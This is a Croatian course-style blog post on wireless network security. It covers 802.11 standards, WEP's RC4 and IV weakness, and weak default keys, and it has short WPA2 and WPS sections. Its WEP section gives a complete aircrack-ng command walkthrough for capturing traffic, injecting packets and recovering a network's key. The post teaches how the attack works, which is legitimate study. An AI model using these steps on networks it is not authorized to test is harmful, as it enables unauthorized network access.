---
layout: post
title:  "Računalne mreže - Sigurnost bežičnih mreža (draft)"
date:   2020-05-31 05:45:00 +0100
categories: racunalne-mreze wifi wep wpa wpa2 wpa3 wps
permalink: /racunalne-mreze/wifi-security/
toc: true
---

<style>

.table-responsive {
  display: block;
  width: 100%;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}

</style>

# Bežične mreže - WiFi


WiFi je najčešće korištena tehnologija za bežičnu komunikaciju. Bazirana je na IEEE 802.11 standardu i kontinuirano se razvija. 

WiFi je zaštitni znak tvrtke WiFi Alliance, što ograničava korištenje izraza <cite>WiFi Certified</cite> samo na proizvodima koji su certificirani za korištenje ove tehnologije.

WiFi koristi radio valove za prijenos informacija na posebnim frekvencijama (starije verzije koriste 2.4 GHz, novije 5 GHz ili kombiniraju obje).

<div class="table-responsive">
<table>
<thead>
  <tr>
    <th colspan="7">IEEE 802.11 protokol</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Standard</td>
    <td>802.11a</td>
    <td>802.11b</td>
    <td>802.11g</td>
    <td>802.11n (WiFi 4)</td>
    <td>802.11ac (WiFi 5)</td>
    <td>802.11ax (WiFi 6)</td>
  </tr>
  <tr>
    <td>Prihvaćen</td>
    <td>1999</td>
    <td>1999</td>
    <td>2003</td>
    <td>2009</td>
    <td>2014</td>
    <td>2019</td>
  </tr>
  <tr>
    <td>Frekvencija</td>
    <td>5 GHz</td>
    <td>2.4 GHz</td>
    <td>2.4 GHz</td>
    <td>2.4/5 GHz</td>
    <td>5 GHz</td>
    <td>2.4/5 GHz</td>
  </tr>
  <tr>
    <td>Max. brzina prijenosa</td>
    <td>54 Mbps</td>
    <td>11 Mbps</td>
    <td>54 Mbps</td>
    <td>600 Mbps</td>
    <td>1 Gbps</td>
    <td>1.2 Gbps</td>
  </tr>
  <tr>
    <td>Doseg (zatvoreni prostor)</td>
    <td>&asymp;30  m</td>
    <td>&asymp;30 m</td>
    <td>&asymp;38 m</td>
    <td>&asymp;68 m</td>
    <td>&asymp;28 m</td>
    <td>&asymp;</td>
  </tr>
  <tr>
    <td>Doseg (otvoreni prostor)</td>
    <td>&asymp;122 m</td>
    <td>&asymp;138 m</td>
    <td>&asymp;138 m</td>
    <td>&asymp;252 m</td>
    <td>&asymp;305 m</td>
    <td>&asymp;</td>
  </tr>
</tbody>
</table>
</div>

* vrijednosti mogu varirati ovisno o proizvođaču mrežne opreme

![wifi network](/assets/rm/wifi/wifi_net.png)

***Basic service set (BSS)*** je najmanji dio bežične mreže koji se sastoji od bežičnih mrežnih čvorova (***station***) koji 
djeluju koristeći jednake protokole za pristup mreži.

***BSS*** može biti izoliran, ili povezan na *okosnicu* **distribucijskog sustava** (***DS***) kroz **pristupnu točku** (***AP***)

Slijedeći izrazi se koriste prilikom dijagnostike ili testiranja ranjivosti bežičnih mreža u raznim aplikacijama.

**BSSID** - jedinstveni identifikator mreže, MAC adresa pristupne točke

**ESSID** - naziv pristupne točke

Bežične mreže mogu biti **nezaštićene** (*otvorene*) ili zaštićene. Zaštita mreže se obavlja kriptiranjem podataka koji se prenose 
mrežom i za pristup mreži je potrebno znati **sigurnosni ključ** ili posjedovati neku vrstu certifikata (*kriptiranje koji se najčešće koristi u poslovne svrhe*).
Tijekom godina razvoja IEEE 802.11 protokola, nastale su različite verzije zaštite mreže za privatne i poslovne korisnike.

## WEP zaštita

**WEP (Wireless Encryption Protocol)** je protokol za zaštitu bežičnih mreža, opisan IEEE standardom 802.11b.
WEP zaštita odnosi se na fizički i sloj podatkovne veze (OSI model računalne mreže) u
računalnoj mreži, a temelji se na enkripciji podataka između krajnjih točaka.
WEP koristi kriptografske ključeve standardnih duljina od 64, 128 i 256 bita. Optimalna duljina ključa je ona koja onemogućuje
njegovo otkrivanje (što veća), a da se enkripcija istovremeno može obaviti što brže (što manja).
Kriptiranje i dekriptiranje podatka obavlja se tajnim ključem u krajnjim točkama, a protokol uključuje
provjeru integriteta poruke i provjeru identiteta korisnika, odnosno metode kojima se može utvrditi je li
poruka bila mijenjana između izvorišta i odredišta.

WEP enkripcija koristi **RC4 sustav** za kriptiranje podatkovnih tokova, koji na temelju ključa stvara
*nasumičan niz* kojim se pomoću **XOR funkcije** kriptira ulazna poruka. Poznavanjem ključa moguće je upotrebom iste funkcije niz dekriptirati na odredištu. 

Slaba točka WEP protokola upravo je enkripcija podataka. Ukoliko napadač ima mogućnost prisluškivanja mreže te zna kako se stvara niz u RC4
algoritmu, kriptoanalizom može otkriti WEP ključ. Kako bi se izbjeglo ponavljanje nizova kojima se
kriptiraju podaci uz ključ se u RC4 poruci šalje i proizvoljni **inicijalizacijski vektor (IV)** veličine 24 bita. 
Mreže koje imaju veliki promet moraju generirati veliki broj inicijalizacijskih vektora, pa postoji velika
vjerojatnost ponavljanja istog niza (npr. isti niz ponovit će se s vjerojatnošću od 50% nakon 5000 kriptiranih paketa). 

![WEP](/assets/rm/wifi/wep-1.png)

> **Zanimljivost**
>
> U početku su svi kućni usmjernici dolazili sa zadanim postavkama proizvođača. 
> Te su postavke najčešće bile minimalne (otvorena mreža ili WEP) i često su se ponavljale ili mogle predvidjeti, što predstavlja
> veliki sigurnosni rizik.
>
> Neki su telekom operateri, odnosno njihova služba za korisnike, u vrijeme dok je još bio aktualan JMBG 
> (jedinstveni matični broj građana) korisnicima "preporučali" da za WEP ključ postave upravo svoj JMBG, jer je
> odgovarao zahtjevima za duljinu ključa od 13 znakova (128 bitni WEP ključ). Kako su računala vrlo spretna sa brojevima,
> takav ključ im unatoč svojoj duljini nije predstavljao veliki problem. Tako je napadač osim pristupa vašoj mreži,
> dobio i uvid u JMBG (<a href ="https://hr.wikipedia.org/wiki/Mati%C4%8Dni_broj_gra%C4%91ana" target="_blank">koji je o vama otkrivao
> neke stvari</a>). Danas se takva praksa izbjegava.

### Probijanje WEP zaštite

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src="https://www.youtube-nocookie.com/embed/svCa25vaN8g" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>


1. korak - pokrenuti airmon-ng i ispisati popis dostupnih wlan sučelja

    `sudo airmon-ng`

2. korak - pokrenuti 'Monitor Mode' na sučelju wlan0
  
    **Ako postoje procesi koji koriste karticu (ispiše se upozorenje u prethodnom koraku), ugasiti ih pomoću naredbe:**
    `sudo airmon-ng check kill `

    `sudo airmon-ng start wlan0`

3. korak - ispisati sve WiFi mreže koje lovi mrežna kartica

    `sudo airodump-ng wlan0mon`

    **Obavezno napisati** `wlan0mon` **jer je to sučelje koje se koristi za 'Monitor Mode'**

4. korak - zapisati podatke o mreži dobivene u prethodnom koraku

    - BSSID
    - kanal (CH)
    - ESSID (nije nužno)

    Nakon toga prekinuti skeniranje sa CTRL + C.

5. korak - pokrenuti prikupljanje paketa za željenu mrežu

    napraviti novi direktorij sa naredbom `mkdir direktorij` i prebaciti se u njega sa naredbom `cd direktorij`
    
    `sudo airodump-ng --bssid BSSID_mreže -w ESSID_mreže -c Kanal_mreže wlan0mon`

    - `-bssid -> BSSID mreže (MAC adresa routera)`

    - `-w -> naziv datoteke u koju će se pohraniti paketi (u trenutnom direktoriju)`

    - `-c -> kanal na kojem je mreža`

    - `wlan0mon -> sučelje za prikupljanje paketa`

    Otvoriti novi terminal (NE ZATVARATI ili prekidati airodump):
    
    `sudo aireplay-ng -1 0 -a BSSID_mreže wlan0mon` - napad <a href="https://www.aircrack-ng.org/doku.php?id=fake_authentication">*lažnom autentifikacijom*</a>

    Nakon što postupak uspješno završi ("Association successful"), pokrenuti:
    
    `sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b BSSID_mreže wlan0mon`

    Nakon nekog vremena, program ispisuje podatke o prikupljenom paketu i pita korisnika želi li koristiti taj paket. Potvrditi sa 'y'.
    
    Kada `airodump` prikupi **više od 10.000 paketa (#Data)**, krenuti na slijedeći korak.

    Prethodno pokrenute programe nije potrebno prekidati, ali je moguće kombinacijom CTRL + C. Nije preporučljivo!

    Ako nije prikupljen dovoljan broj paketa, potrebno je ponoviti postupak od 5. koraka.

6. korak - dekriptiranje ključa

    Nakon što airodump-ng prikupi više od 10.000 #Data paketa, moguće je dekriptirati ključ
    
    *Naziv datoteke potrebne aircracku provjeriti sa naredbom* `ls`
    
    `aircrack-ng Naziv_datoteke-01.cap`

    Ako je postupak uspješan, aircrack ispisuje poruku:

    `KEY FOUND! [ključ u heksadekadskom zapisu]`
    
    `(ASCII: ASCII vrijednost ključa, ako postoji)`

    Ako nije, program ispisuje da se ponovni metoda za pribavljanje paketa sa većim brojem paketa.


## WPA / WPA2 zaštita

> **Zanimljivost**
>
> <a href="https://www.nickkusters.com/en/Services/Thomson-SpeedTouch" target="_blank">Primjer 1</a>: Postoje web aplikacije u koje je 
> moguće unijeti zadani naziv WiFi mreže, a aplikacija vraća 1 ili više kombinacija ključeva
> koje mogu odgovarati tom usmjerniku. Kako je proizvođač koristio slabe algoritme za generiranje ključeva, moguće ih je izračunati
> posebnim algoritmom iz naziva WiFi mreže. Unatoč tome što korisnik koristi WPA ili čak WPA2 zaštitu, ključ je moguće izračunati.

### Probijanje WPA2 zaštite

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src="https://www.youtube-nocookie.com/embed/d8N4JDdrCUg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

## WPS

WPS je odlična ideja, ali njegova izvedba nije dobra. Postoji više aplikacija koje iskorištavaju propuste
u njegovim slabim algoritmima, tako da je moguće pomoću tih ranjivosti dobiti ključ mreže, bez obzira koju zaštitu
koristi mreža.

## Izvori

### WiFi

<ol>
    <li><a href="https://www.wi-fi.org/discover-wi-fi"><cite>Discover Wifi</cite>, WiFi Alliance</a>, pregledano 20.05.2020.</li>
    <li><a href="https://www.digitaltrends.com/computing/what-is-wi-fi/"><cite>What is Wifi?</cite>, Digital Trends</a>, pregledano 20.05.2020.</li>
    <li><a href="https://keshavdulal.github.io/bscit-network-security-notes/bscit-ns-u5-wireless-security.html"><cite>Wifi Security Notes</cite>, BSCIT</a>, pregledano 23.05.2020.</li>
    <li><a href="https://www.wi-fi.org/discover-wi-fi/wi-fi-certified-6"><cite>Discover Wifi 6</cite>, WiFi Alliance</a>, pregledano 23.05.2020.</li>
</ol>

### WEP

<ol>
  <li><a href="http://download.aircrack-ng.org/wiki-files/doc/A_Key_Recovery_Attack_on_the_wep.pdf"><cite>A Key Recovery Attack on the WEP</cite>, Aircrack-ng</a>, pregledano 30.05.2020.</li>
  <li><a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf"><cite>Intercepting Mobile Communications: The Insecurity of 802.11</cite></a>, Nikita Borisov, Ian Goldberg, David Wagner, pregledano 30.05.2020.</li>
  <li><a href="http://www.scs.stanford.edu/~sorbo/bittau-wep-slides.pdf"><cite>The Final Nail in WEP’s Coffin</cite> (prezentacija)</a>, Andrea Bittau, Mark Handley, Joshua Lackey, pregledano 30.05.2020.</li>
  <li><a href="https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay"><cite>Aireplay-ng - Interactive packet replay</cite>, Aircrack-ng</a>, pregledano 30.05.2020.</li>
  <li><a href="https://mentor.ieee.org/802.11/dcn/00/11-00-0362-00-000e-unsafe-at-any-key-size-an-analysis-of-the-wep-encapsulation.doc"><cite>Unsafe at any key size; An analysis of the WEP encapsulation</cite>, Jesse R. Walker (Intel)</a>, pregledano 31.05.2020.</li>
</ol>

### WPA/WPA2

<ol>
  <li><a href="https://www.cert.hr/wp-content/uploads/2009/06/CCERT-PUBDOC-2009-06-267.pdf"><cite>WPA2 zaštita, CCERT-PUBDOC-2009-06-267</cite>, Aircrack-ng</a>, pregledano 30.05.2020.</li>
</ol>

### WPS

<ol>
  <li><a href="https://www.wi-fi.org/download.php?file=/sites/default/files/private/Wi-Fi_Simple_Configuration_Technical_Specification_v2.0.5.pdf"><cite>Wi-Fi Simple Configuration, Technical Specification, v2.0.5</cite>, WiFi Alliance</a>, pregledano 30.05.2020.</li>
</ol>

<p xmlns:dct="http://purl.org/dc/terms/" xmlns:cc="http://creativecommons.org/ns#" class="license-text"><a rel="cc:attributionURL" href="https://mario-kopjar.from.hr/racunalne-mreze/wifi-security/"><span rel="dct:title">Sigurnost bezicnih mreza</span></a> by <a rel="cc:attributionURL" href="https://mario-kopjar.from.hr"><span rel="cc:attributionName">Mario Kopjar</span></a> is licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0<img style="height:22px!important;margin-left: 3px;vertical-align:text-bottom;" src="https://search.creativecommons.org/static/img/cc_icon.svg" /><img  style="height:22px!important;margin-left: 3px;vertical-align:text-bottom;" src="https://search.creativecommons.org/static/img/cc-by_icon.svg" /><img  style="height:22px!important;margin-left: 3px;vertical-align:text-bottom;" src="https://search.creativecommons.org/static/img/cc-nc_icon.svg" /></a></p>